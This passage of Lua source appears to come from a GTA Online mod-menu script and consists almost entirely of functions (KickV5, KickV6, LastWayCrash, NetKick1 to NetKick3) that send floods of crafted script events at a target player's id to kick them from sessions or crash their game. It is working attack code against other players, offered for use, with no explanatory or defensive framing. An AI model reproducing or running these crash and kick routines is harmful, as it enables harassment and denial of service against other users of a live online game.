        send_script_event(2565163112, pid, {91436768, 4244161632, 1813038378, 69, 103})
        send_script_event(3328407309, pid, {55963135, 56512451, 1818412324, 69, 103})
        send_script_event(3240141023, pid, {4266445567, 74, 1817232874})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1813693788, 2565163112, 91436768})
        send_script_event(3328407309, pid, {55963135, 56512451, 1816315140, 3, 0})
        send_script_event(3240141023, pid, {4266445567, 104, 1823131116})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1823000034, 3, 0})
        send_script_event(3328407309, pid, {55963135, 56512451, 1818150168, 713476592, 0})
        send_script_event(3240141023, pid, {4266445567, 104, 1815922046})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1815922046, 3328407309, 55963135})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1812907336, 1814628608, 4273591552})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1815922046, 3328407309, 55963135})
        util.yield(10)
    end
end
function KickV5(pid, a1)
    for U = 1, a1 do
        send_script_event(-1491386500, pid, {-1, 0})
        send_script_event(-1729804184, pid, {-1, 0})
        send_script_event(1428412924, pid, {-1, 0})
        send_script_event(823645419, pid, {-1, 0})
        send_script_event(1070934291, pid, {-1, 0})
        send_script_event(-1949011582, pid, {-1, 0})
        send_script_event(-171207973, pid, {-1, 0})
        send_script_event(-1212832151, pid, {-1, 0})
        send_script_event(-1559754940, pid, {-1, 0})
        send_script_event(-1054826273, pid, {-1, 0})
        send_script_event(1620254541, pid, {-1, 0})
        send_script_event(1401831542, pid, {-1, 0})
        send_script_event(-1491386500, pid, {-1, 0})
        send_script_event(56335450, pid, {pid, 532165, pid})
        send_script_event(-171207973, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(-171207973, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(-171207973, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(-171207973, pid, {0, 0, 46190868, 0, 2})
        send_script_event(-171207973, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(-171207973, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-171207973, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-171207973, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(-171207973, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-171207973, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-171207973, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-171207973, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-171207973, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-171207973, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            -171207973,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -171207973,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            -171207973,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -81613951,
            pid,
            {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691}
        )
        send_script_event(
            -1292453789,
            pid,
            {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691}
        )
        send_script_event(
            1623637790,
            pid,
            {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691}
        )
        send_script_event(
            -1905128202,
            pid,
            {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691}
        )
        send_script_event(
            1160415507,
            pid,
            {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691}
        )
        send_script_event(
            150902083,
            pid,
            {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691}
        )
        send_script_event(
            -2120750352,
            pid,
            {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691}
        )
        send_script_event(
            0xE6116600,
            pid,
            {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691}
        )
        send_script_event(-720040631, pid, {})
        send_script_event(
            -1949011582,
            U,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -1949011582,
            U,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            -1949011582,
            U,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(0xF5CB92DB, pid, {0, 0, 46190868, 0, 2})
        send_script_event(0xF5CB92DB, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(0xF5CB92DB, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(0xF5CB92DB, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-2122716210, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-2120750352, U, {U, 1630317 + 1 + U * 595 + 506})
        send_script_event(0xE6116600, U, {U, 1630317 + 1 + U * 595 + 506})
        send_script_event(-977515445, U, {-1, 500000, 849451549, -1, -1})
        send_script_event(767605081, U, {-1, 500000, 849451549, -1, -1})
        send_script_event(-1949011582, U, {-1139568479, -1, 1, 100099})
        send_script_event(
            -2122716210,
            U,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -922075519,
            U,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            -1975590661,
            U,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(-1491386500, pid, {-1, 0, -1, 0})
        send_script_event(-1491386500, pid, {-1, 0, -1, 0})
        send_script_event(-1491386500, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-1491386500, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-1491386500, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1491386500, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1491386500, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1491386500, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1491386500, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1491386500, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1491386500, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1491386500, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1491386500, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1491386500, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1491386500, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1491386500, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1491386500, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1491386500, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1491386500, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(
            -1491386500,
            pid,
            {84857178, 61749268, -80053711, -78045655, 56341553, -78686524, -46044922, -22412109, 29388428, -56335450}
        )
        send_script_event(
            -1491386500,
            pid,
            {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691}
        )
        send_script_event(-1491386500, pid, {pid, 532165, pid})
        send_script_event(2099816323, pid, {-1, 0, -1, 0})
        send_script_event(2099816323, pid, {-1, 0, -1, 0})
        send_script_event(2099816323, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(2099816323, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(2099816323, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(2099816323, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(2099816323, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(2099816323, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(2099816323, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(2099816323, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(2099816323, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(2099816323, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(2099816323, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(2099816323, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(2099816323, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(2099816323, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(2099816323, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(2099816323, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(2099816323, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(
            2099816323,
            pid,
            {84857178, 61749268, -80053711, -78045655, 56341553, -78686524, -46044922, -22412109, 29388428, -56335450}
        )
        send_script_event(
            2099816323,
            pid,
            {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691}
        )
        send_script_event(2099816323, pid, {pid, 532165, pid})
        send_script_event(-1212832151, pid, {-1, 0, -1, 0})
        send_script_event(-1212832151, pid, {-1, 0, -1, 0})
        send_script_event(-1212832151, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-1212832151, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-1212832151, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        util.yield()
    end
end
function KickV6(pid, a1)
    for U = 1, a1 do
        send_script_event(0xC120A0DF, pid, {pid, 532165, pid})
        send_script_event(-1882923979, pid, {pid, 532165, pid})
        send_script_event(1949011582, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(1559754940, pid, {pid, 532165, pid})
        send_script_event(891272013, pid, {pid, 532165, pid})
        send_script_event(1097312011, pid, {pid, 532165, pid})
        send_script_event(0xf5cb92db, pid, {pid, 532165, pid})
        send_script_event(0xF5CB92DB, pid, {pid, 532165, pid})
        send_script_event(-46044922, pid, {pid, 532165, pid})
        send_script_event(-78686524, pid, {pid, 532165, pid})
        send_script_event(56341553, pid, {pid, 532165, pid})
        send_script_event(-80053711, pid, {pid, 532165, pid})
        send_script_event(61749268, pid, {pid, 532165, pid})
        send_script_event(84857178, pid, {pid, 532165, pid})
        send_script_event(-66094971, pid, {pid, 532165, pid})
        send_script_event(-922075519, pid, {pid, 532165, pid})
        send_script_event(-26800537, pid, {pid, 532165, pid})
        send_script_event(-17645264, pid, {pid, 532165, pid})
        send_script_event(-922075519, pid, {pid, 532165, pid})
        send_script_event(-1975590661, pid, {pid, 532165, pid})
        send_script_event(-1882923979, pid, {pid, 532165, pid})
        send_script_event(-1139568479, pid, {pid, 532165, pid})
        send_script_event(-1949011582, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(-1559754940, pid, {pid, 532165, pid})
        send_script_event(-87967637, pid, {pid, 532165, pid})
        send_script_event(0xf5cb92db, pid, {pid, 532165, pid})
        send_script_event(0xE6116600, pid, {pid, 532165, pid})
        send_script_event(0x8A3EE0FB, pid, {pid, 532165, pid})
        send_script_event(0xC90A3E81, pid, {pid, 532165, pid})
        send_script_event(0x8179EBCE, pid, {pid, 532165, pid})
        send_script_event(1139568479, pid, {pid, 532165, pid})
        send_script_event(0x8BD47182, pid, {pid, 532165, pid})
        send_script_event(0x2DC0B959, pid, {pid, 532165, pid})
        send_script_event(0xC5BC4C4B, pid, {pid, 532165, pid})
        send_script_event(1139568479, pid, {pid, 532165, pid})
        send_script_event(-1949011582, pid, {pid, 532165, pid})
        send_script_event(-922075519, pid, {pid, 532165, pid})
        send_script_event(1139568479, pid, {pid, 532165, pid})
        send_script_event(-1949011582, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(-977515445, pid, {pid, 532165, pid})
        send_script_event(2122716210, pid, {pid, 532165, pid})
        send_script_event(-171207973, pid, {pid, 532165, pid})
        send_script_event(-435067392, pid, {pid, 532165, pid})
        send_script_event(-1975590661, pid, {pid, 532165, pid})
        send_script_event(-922075519, pid, {pid, 532165, pid})
        send_script_event(1139568479, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(2122716210, pid, {pid, 532165, pid})
        send_script_event(0xC5BC4C4B, pid, {pid, 532165, pid})
        send_script_event(-2122716210, pid, {pid, 532165, pid})
        send_script_event(0x8BD47182, pid, {pid, 532165, pid})
        send_script_event(-1949011582, pid, {pid, 532165, pid})
        send_script_event(-1139568479, pid, {pid, 532165, pid})
        send_script_event(-1139568479, pid, {pid, 532165, pid})
        send_script_event(0xC5BC4C4B, pid, {pid, 532165, pid})
        send_script_event(-922075519, pid, {pid, 532165, pid})
        send_script_event(1975590661, pid, {pid, 532165, pid})
        send_script_event(-1139568479, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(-2122716210, pid, {pid, 532165, pid})
        send_script_event(-1949011582, pid, {pid, 532165, pid})
        send_script_event(922075519, pid, {pid, 532165, pid})
        send_script_event(1975590661, pid, {pid, 532165, pid})
        send_script_event(1882923979, pid, {pid, 532165, pid})
        send_script_event(1139568479, pid, {pid, 532165, pid})
        send_script_event(1949011582, pid, {pid, 532165, pid})
        send_script_event(0xC5BC4C4B, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0x2DC0B959, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0x8BD47182, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1139568479, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0x8179EBCE, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0xC90A3E81, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0x8A3EE0FB, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-2122716210, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(767605081, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(2122716210, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(977515445, pid, {pid, 532165, pid})
        send_script_event(-977515445, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(-1730227041, pid, {pid, 532165, pid})
        send_script_event(-435067392, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(526625102, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1347850743, pid, {pid, 532165, pid})
        send_script_event(-1212832151, pid, {pid, 532165, pid})
        send_script_event(1428412924, pid, {pid, 532165, pid})
        send_script_event(-435067392, pid, {pid, 532165, pid})
        send_script_event(-799924696, pid, {pid, 532165, pid})
        send_script_event(1428412924, pid, {pid, 532165, pid})
        send_script_event(2646045593, pid, {-1, 0, -1, 0})
        send_script_event(1347850743, pid, {-1, 0, -1, 0})
        send_script_event(-2122716210, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-2122716210, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-2120750352, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(3859899904, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-81613951, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1292453789, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1623637790, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1905128202, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-435067392, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-2120750352, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(3859899904, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-81613951, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1292453789, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1623637790, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1905128202, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1160415507, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(3317451851, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(
            -1975590661,
            pid,
            {84857178, 61749268, -80053711, -78045655, 56341553, -78686524, -46044922, -22412109, 29388428, -56335450}
        )
        send_script_event(
            -922075519,
            pid,
            {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691}
        )
        send_script_event(-452918768, pid, {pid, 532165, pid})
        send_script_event(1428412924, pid, {pid, 532165, pid})
        send_script_event(-1890951223, pid, {pid, 532165, pid})
        send_script_event(-1252906024, pid, {pid, 532165, pid})
        send_script_event(-1212832151, pid, {pid, 532165, pid})
        send_script_event(-966559987, pid, {pid, 532165, pid})
        send_script_event(733106126, pid, {pid, 532165, pid})
        send_script_event(-435067392, pid, {pid, 532165, pid})
        send_script_event(-442306200, pid, {pid, 532165, pid})
        send_script_event(-1559754940, pid, {pid, 532165, pid})
        send_script_event(1881968783, pid, {pid, 532165, pid})
        send_script_event(-1729804184, pid, {pid, 532165, pid})
        send_script_event(-977515445, pid, {pid, 532165, pid})
        send_script_event(-1491386500, pid, {pid, 532165, pid})
        send_script_event(2099816323, pid, {pid, 532165, pid})
        send_script_event(1401831542, pid, {pid, 532165, pid})
        send_script_event(1317868303, pid, {pid, 532165, pid})
        send_script_event(1620254541, pid, {pid, 532165, pid})
        send_script_event(-1054826273, pid, {pid, 532165, pid})
        send_script_event(-1256990787, pid, {pid, 532165, pid})
        send_script_event(121406262, pid, {pid, 532165, pid})
        send_script_event(1070934291, pid, {pid, 532165, pid})
        send_script_event(1070934291, pid, {pid, 532165})
        send_script_event(1070934291, pid, {pid, -1, -1, -1, -1})
        send_script_event(435067392, pid, {pid, 532165, pid})
        send_script_event(171207973, pid, {pid, 532165, pid})
        send_script_event(1212832151, pid, {pid, 532165, pid})
        send_script_event(1317868303, pid, {pid, 532165, pid})
        send_script_event(1054826273, pid, {pid, 532165, pid})
        send_script_event(1620254541, pid, {pid, 532165, pid})
        send_script_event(1401831542, pid, {pid, 532165, pid})
        send_script_event(1491386500, pid, {pid, 532165, pid})
        send_script_event(1070934291, pid, {pid, 532165, pid})
        send_script_event(1949011582, pid, {pid, 532165, pid})
        send_script_event(720040631, pid, {pid, 532165, pid})
        send_script_event(1559754940, pid, {pid, 532165, pid})
        send_script_event(87967637, pid, {pid, 532165, pid})
        send_script_event(61749268, pid, {pid, 532165, pid})
        send_script_event(80053711, pid, {pid, 532165, pid})
        send_script_event(78045655, pid, {pid, 532165, pid})
        send_script_event(56341553, pid, {pid, 532165, pid})
        send_script_event(78686524, pid, {pid, 532165, pid})
        send_script_event(46044922, pid, {pid, 532165, pid})
        send_script_event(22412109, pid, {pid, 532165, pid})
        send_script_event(29388428, pid, {pid, 532165, pid})
        send_script_event(56335450, pid, {pid, 532165, pid})
        util.yield(10)
    end
end
function LastWayCrash(pid, a1)
    for U = 1, a1 do
        if math.random(1, 900) == 1 then
            util.yield(0)
        end
        send_script_event(3328407309, pid, {55963135, 56512451, 1820116286, 0, 0})
        send_script_event(3240141023, pid, {4266445567, 74, 1816446214})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1816839436, 139, 1})
        send_script_event(3328407309, pid, {55963135, 56512451, 1812251974, 674298504, 0})
        send_script_event(3240141023, pid, {4266445567, 74, 1815135562})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1819591990, 466, 2324838480})
        send_script_event(3328407309, pid, {55963135, 56512451, 1816839436, 139, 1})
        send_script_event(3240141023, pid, {4266445567, 2324837584, 1817494806})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1823000034, 69, 103})
        send_script_event(3328407309, pid, {55963135, 56512451, 1816184090, 69, 103})
        send_script_event(3240141023, pid, {4266445567, 104, 1819854130})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1818412324, 3, 0})
        send_script_event(3328407309, pid, {55963135, 56512451, 1819591990, 25, 48})
        send_script_event(3240141023, pid, {4266445567, 56512451, 1816839436})
        send_script_event(3240141023, pid, {4266445567, 56512451, 1816839436})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1815659890, 3, 0})
        send_script_event(23328407309, pid, {55963135, 56512451, 1813038378, 69, 103})
        send_script_event(3240141023, pid, {4266445567, 74, 1812383040})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1812645196, 713476592, 0})
        send_script_event(3328407309, pid, {55963135, 56512451, 1813431632, 25, 48})
        send_script_event(3240141023, pid, {4266445567, 104, 1817888028})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1815135562, 25, 48})
        send_script_event(3328407309, pid, {55963135, 56512451, 1823262190, 674298504, 0})
        send_script_event(3240141023, pid, {4266445567, 104, 1817101576})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1813038378, 69, 103})
        send_script_event(3328407309, pid, {55963135, 56512451, 1818412324, 69, 103})
        send_script_event(3240141023, pid, {4266445567, 74, 1817232874})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1813693788, 2565163112, 91436768})
        send_script_event(3328407309, pid, {55963135, 56512451, 1816315140, 3, 0})
        send_script_event(3240141023, pid, {4266445567, 104, 1823131116})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1823000034, 3, 0})
        send_script_event(3328407309, pid, {55963135, 56512451, 1818150168, 713476592, 0})
        send_script_event(3240141023, pid, {4266445567, 104, 1815922046})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1815922046, 3328407309, 55963135})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1812907336, 1814628608, 4273591552})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1815922046, 3328407309, 55963135})
        send_script_event(2999333691, pid, {4, 4, 0, 32})
        send_script_event(3263869266, pid, {4, 4, 0, 32})
        send_script_event(3328407309, pid, {55963135, 56512451, 1820116286, 0, 0})
        send_script_event(3240141023, pid, {4266445567, 74, 1816446214})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1816839436, 139, 1})
        send_script_event(3328407309, pid, {55963135, 56512451, 1812251974, 674298504, 0})
        send_script_event(3240141023, pid, {4266445567, 74, 1815135562})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1819591990, 466, 2324838480})
        send_script_event(3328407309, pid, {55963135, 56512451, 1816839436, 139, 1})
        send_script_event(3240141023, pid, {4266445567, 2324837584, 1817494806})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1823000034, 69, 103})
        send_script_event(3328407309, pid, {55963135, 56512451, 1816184090, 69, 103})
        send_script_event(3240141023, pid, {4266445567, 104, 1819854130})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1818412324, 3, 0})
        send_script_event(3328407309, pid, {55963135, 56512451, 1819591990, 25, 48})
        send_script_event(3240141023, pid, {4266445567, 56512451, 1816839436})
        send_script_event(3240141023, pid, {4266445567, 56512451, 1816839436})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1815659890, 3, 0})
        send_script_event(23328407309, pid, {55963135, 56512451, 1813038378, 69, 103})
        send_script_event(3240141023, pid, {4266445567, 74, 1812383040})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1812645196, 713476592, 0})
        send_script_event(3328407309, pid, {55963135, 56512451, 1813431632, 25, 48})
        send_script_event(3240141023, pid, {4266445567, 104, 1817888028})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1815135562, 25, 48})
        send_script_event(3328407309, pid, {55963135, 56512451, 1823262190, 674298504, 0})
        send_script_event(3240141023, pid, {4266445567, 104, 1817101576})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1813038378, 69, 103})
        send_script_event(3328407309, pid, {55963135, 56512451, 1818412324, 69, 103})
        send_script_event(3240141023, pid, {4266445567, 74, 1817232874})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1813693788, 2565163112, 91436768})
        send_script_event(3328407309, pid, {55963135, 56512451, 1816315140, 3, 0})
        send_script_event(3240141023, pid, {4266445567, 104, 1823131116})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1823000034, 3, 0})
        send_script_event(3328407309, pid, {55963135, 56512451, 1818150168, 713476592, 0})
        send_script_event(3240141023, pid, {4266445567, 104, 1815922046})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1815922046, 3328407309, 55963135})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1812907336, 1814628608, 4273591552})
        send_script_event(2565163112, pid, {91436768, 4244161632, 1815922046, 3328407309, 55963135})
        send_script_event(3328407309, pid, H(pid))
        send_script_event(2565163112, pid, H(pid))
        util.yield(10)
    end
end
function NetKick1(pid, a1)
    for U = 1, a1 do
        util.trigger_script_event(1 << pid, {-2120750352, pid, 1630317 + 1 + pid * 595 + 506})
        util.trigger_script_event(1 << pid, {0xE6116600, pid, 1630317 + 1 + pid * 595 + 506})
        util.trigger_script_event(1 << pid, {-720040631, math.random(46190868, 999999999)})
        util.trigger_script_event(1 << pid, {-922075519, pid, pid, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, -1})
        util.trigger_script_event(
            1 << pid,
            {
                -1975590661,
                pid,
                84857178,
                61749268,
                -80053711,
                -78045655,
                56341553,
                -78686524,
                -46044922,
                -22412109,
                29388428,
                -56335450
            }
        )
        util.trigger_script_event(
            1 << pid,
            {-1975590661, pid, pid, 0, 0, 2147483647, 0, 1590682 + pid * 883 + 99 + 28, 1}
        )
        util.trigger_script_event(1 << pid, {-1975590661, pid, pid, 0, 0, 1000, 0, 1590682 + pid * 883 + 99 + 28, 1})
        util.trigger_script_event(1 << pid, {-2122716210, pid, 91645, -99683, 1788, 60877, 55085, 72028})
        util.trigger_script_event(1 << pid, {-2120750352, pid, pid, 1630317 + 1 + pid * 595 + 506})
        util.trigger_script_event(1 << pid, {-2122716210, pid, 91645, -99683, 1788, 60877, 55085, 72028})
        util.trigger_script_event(1 << pid, {0xE6116600, pid, pid, 1630317 + 1 + pid * 595 + 506})
        util.trigger_script_event(1 << pid, {-81613951, pid, 1630317 + 1 + U * 595 + 506})
        util.trigger_script_event(1 << pid, {-1292453789, pid, 1630317 + 1 + U * 595 + 506})
        util.trigger_script_event(1 << pid, {1623637790, pid, 1630317 + 1 + U * 595 + 506})
        util.trigger_script_event(1 << pid, {-1905128202, pid, 1630317 + 1 + U * 595 + 506})
        util.trigger_script_event(1 << pid, {1160415507, pid, 1630317 + 1 + U * 595 + 506})
        util.trigger_script_event(1 << pid, {-2120750352, pid, 1630317 + 1 + U * 595 + 506})
        util.trigger_script_event(1 << pid, {0xE6116600, pid, 1630317 + 1 + U * 595 + 506})
        util.yield()
    end
end
function NetKick2(pid, a1)
    for U = 1, a1 do
        par1 = d[math.random(1, #d)]
        par2 = d[math.random(1, #d)]
        par3 = d[math.random(1, #d)]
        par4 = d[math.random(1, #d)]
        par5 = d[math.random(1, #d)]
        send_script_event(a[math.random(1, #a)], pid, {pid, par5, par3, par1, par5, par3, par1, par5, par3, pid})
        send_script_event(b[math.random(1, #b)], pid, {pid, par5, par3, par1, par5, par3, par1, par5, par3, pid})
        send_script_event(c[math.random(1, #c)], pid, {pid, par5, par3, par1, par5, par3, par1, par5, par3, pid})
        send_script_event(-171207973, pid, {0, 30583, 0, 0, 0, 1061578342, 1061578342, 4})
        send_script_event(0xF5CB92DB, pid, {0, 0, 46190868, 0, 2})
        send_script_event(0xF5CB92DB, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(0xF5CB92DB, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(0xF5CB92DB, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-81613951, pid, {pid, 1630317 + 1 + U * 595 + 506})
        send_script_event(-1292453789, pid, {pid, 1630317 + 1 + U * 595 + 506})
        send_script_event(1623637790, pid, {pid, 1630317 + 1 + U * 595 + 506})
        send_script_event(-1905128202, pid, {pid, 1630317 + 1 + U * 595 + 506})
        send_script_event(1160415507, pid, {pid, 1630317 + 1 + U * 595 + 506})
        send_script_event(-2120750352, pid, {pid, 1630317 + 1 + U * 595 + 506})
        send_script_event(0xE6116600, pid, {pid, 1630317 + 1 + U * 595 + 506})
        util.yield()
    end
end
function NetKick3(pid, a1)
    for U = 1, a1 do
        util.trigger_script_event(1 << pid, {-1729804184, pid, math.random(-2147483647, 2147483647), pid})
        util.trigger_script_event(1 << pid, {1428412924, pid, math.random(-2147483647, 2147483647)})
